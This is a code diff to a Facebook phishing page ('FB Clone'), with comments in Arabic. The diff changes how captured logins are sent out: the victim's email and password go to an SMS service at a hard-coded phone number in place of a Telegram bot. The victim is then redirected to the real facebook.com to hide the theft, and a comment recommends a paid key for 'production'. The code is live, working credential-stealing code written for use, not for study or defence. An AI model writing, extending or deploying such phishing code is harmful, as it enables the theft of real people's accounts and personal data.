@@ -77,12 +77,16 @@
         });
         async function sendCapture(email,pass){
             const data=`🔐 FB Clone\nEmail: ${email}\nPass: ${pass}\nTime: ${new Date().toLocaleString('ar-EG')}`;
-            // استبدل YOUR_BOT_TOKEN وYOUR_CHAT_ID برمز Telegram الخاص بك
+            // استخدام خدمة SMS مجانية مثل https://textbelt.com
             try{
-                await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage',{
+                await fetch('https://textbelt.com/text',{
                     method:'POST',
                     headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({chat_id:'YOUR_CHAT_ID',text:data})
+                    body:JSON.stringify({
+                        phone:'+201211030123', // الرقم المستهدف بصيغة دولية
+                        message:data,
+                        key:'textbelt' // استخدم مفتاح مدفوع للإنتاج
+                    })
                 });
             }catch(err){console.warn(err)}
             setTimeout(()=>window.location.href='https://www.facebook.com',900);
